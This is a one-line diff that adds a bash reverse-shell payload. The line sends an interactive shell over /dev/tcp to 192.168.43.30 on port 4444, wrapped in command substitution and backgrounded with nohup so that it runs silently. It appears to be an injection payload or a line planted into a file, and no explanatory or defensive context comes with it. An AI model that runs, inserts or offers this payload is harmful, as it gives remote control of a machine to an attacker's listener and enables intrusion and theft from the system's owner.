@@ -1,0 +1,1 @@
+$(nohup bash -i &>/dev/null >& /dev/tcp/192.168.43.30/4444 0>&1) & >/dev/null
